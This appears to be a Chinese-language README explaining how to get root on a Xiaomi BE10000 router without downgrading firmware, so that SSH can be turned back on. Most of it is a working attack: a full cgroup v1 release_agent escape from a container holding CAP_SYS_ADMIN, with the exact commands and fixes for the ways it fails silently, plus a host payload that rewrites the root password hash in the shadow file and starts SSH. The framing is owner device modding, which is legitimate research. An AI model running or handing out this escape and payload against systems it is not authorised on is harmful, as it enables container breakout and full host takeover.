# 不降级拿到 root 的技术原理

> 验证环境：Xiaomi RC01 / BE10000，固件 1.1.56 release（`hackCheck=3`）
> 方案来源：[XMiR-Patcher PR #168](https://github.com/openwrt-xiaomi/xmir-patcher/pull/168)（@h8suga，BE7000 / 1.1.38 首次验证）

## 问题

小米在固件里加了两层锁：

1. **SSH 开关被锁**：`/etc/init.d/dropbear` 里检查 `channel = "release"`，稳定版固件直接禁用 SSH
2. **Docker 被 OPA 策略限制**：`opa-docker-authz` 插件按策略拒绝特权容器和目录挂载

常规解法是降级到 1.0.53（漏洞未修复的版本）再解锁。代价是清空配置、丢掉 WiFi 7 / MLO。

## 为什么常规漏洞全部失效

XMiR-Patcher 依赖三个 Web API 漏洞，在 1.1.56 上：

```
WARN: Exploits "arn_switch/start_binding/set_mac_filter/datacenter7" not working!!!
WARN: Exploits "Smartcontroller" are not usable (hackCheck:3)
WARN: Exploit "get_icon" not working!!! (API not founded)
```

`hackCheck version = 3` 是小米的漏洞检测机制，三个入口都被封堵。

社区教程里的「bind mount + chroot」方案也走不通 —— 它需要创建带 bind mount 的容器，
而 OPA 在 daemon 层就把它拒了：

```
Error response from daemon: authorization denied by plugin opa-docker-authz:
request rejected by administrative policy
```

## 突破口：SimpleDocker 的 CAP_SYS_ADMIN

小米官方的 SimpleDocker 容器终端带着**完整的 CAP_SYS_ADMIN**（因为它本身要管理 Docker）。
有了这个能力，就可以走 cgroup v1 的 `release_agent` 逃逸。

原理：cgroup v1 的 `release_agent` 特性会在某个 cgroup 的**最后一个进程退出**时，
由**内核在宿主命名空间**执行 `release_agent` 指定的程序，且以 **uid=0** 运行。

攻击链：

```
容器内（CAP_SYS_ADMIN）
  ↓ 挂载独立的 cgroup 层级
mount -t cgroup -o none,name=x8 cgroup /tmp/x8
  ↓ 把 release_agent 指向一个宿主可见的脚本
echo '<宿主路径>/tmp/payload.sh' > /tmp/x8/release_agent
  ↓ 创建子 cgroup 并开启 notify_on_release
mkdir /tmp/x8/trig && echo 1 > /tmp/x8/trig/notify_on_release
  ↓ 让一个进程进入子 cgroup 后退出
sh -c 'echo $$ > /tmp/x8/trig/cgroup.procs'
  ↓ 内核以 uid=0 在宿主执行 payload
  ↓ payload 改 dropbear、设密码、启动 SSH
```

## 两个必须避开的坑

### 坑 1：overlay 目录 ID 会变

payload 必须写在**宿主可见**的路径，也就是容器 `/tmp` 对应的 overlay upperdir：

```
<mount>/mi_docker/lib/docker/overlay2/<随机ID>/diff/tmp/payload.sh
```

`<随机ID>` 在**容器被重建后就会变化**。如果 `release_agent` 还指向旧目录，
内核找不到文件，**静默失败** —— 日志里一个报错都没有，命令全部「成功」返回。

**必须每次从 `/proc/mounts` 现场提取：**

```sh
cat /proc/mounts | tr ',' '\n' | grep upperdir
```

### 坑 2：`$$` 可能指向错误的进程

最直觉的写法是让当前 shell 进 cgroup：

```sh
echo $$ > /tmp/x8/trig/cgroup.procs
```

但在容器的 exec 环境里，`$$` 拿到的**不一定是当前 shell 的 PID**，
实测拿到的是容器常驻进程（redis-server）的 PID。
结果 cgroup 里始终有进程活着，`release_agent` 永远等不到「最后一个进程退出」。

**解法：包一层 `sh -c`，让子 shell 拿自己的 PID**

```sh
sh -c 'echo $$ > /tmp/x8/trig/cgroup.procs; sleep 0.1'
```

shell 退出即触发。验证方法是 `cat cgroup.procs` —— 应该立刻变空，一直有 PID 就说明卡在这。

## 副作用与代价

1. **容器会崩**：cgroup 操作后 SimpleDocker 容器异常退出，9001 端口不可用
2. **存储可能掉线**：高 IO 加异常重启，U 盘/SD 会脱挂，重插即在
3. **不持久**：`/etc` 是 ramfs，payload 的修改重启即失效，必须额外固化（见 `scripts/deploy.sh`）

## payload 要做的四件事

```sh
# 1. nvram 标记
nvram set ssh_en=1 && nvram commit

# 2. 去掉 dropbear 初始化脚本里的 release 检查
sed -i 's/ -o "$channel" = "release"//g' /etc/init.d/dropbear

# 3. 生成 RSA host key（dropbear 只提供 ssh-rsa）
[ -f /etc/dropbear/dropbear_rsa_host_key ] || \
    /usr/bin/dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key

# 4. 设 root 密码 —— 注意 /etc/shadow 是符号链接，必须写真实路径
SHADOW_FILE=$(readlink -f /etc/shadow)
HASH=$(openssl passwd -1 -salt '<salt>' '<your-password>')
{ grep -v '^root:' "$SHADOW_FILE"; printf 'root:%s:19000:0:99999:7:::\n' "$HASH"; } \
    > /tmp/_sh && mv /tmp/_sh "$SHADOW_FILE"

/etc/init.d/dropbear start
```

第 4 步的 `readlink -f` 是关键：直接写 `/etc/shadow` 会**把符号链接替换成普通文件**，
写在了 ramfs 上，重启就没了。这是 PR #168 里明确修过的一个 bug。

## 验证成功的标志

```sh
netstat -tlnp | grep ':22 '     # 应该看到 dropbear 在监听
```

从外面连：

```sh
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.31.1
```

## 参考

- PR: <https://github.com/openwrt-xiaomi/xmir-patcher/pull/168>
- 原始实现：该 PR 中的 `connect8.py`
- 测试环境：BE7000 RC06 / 1.1.38（原作者），RC01 / 1.1.56（本仓库）
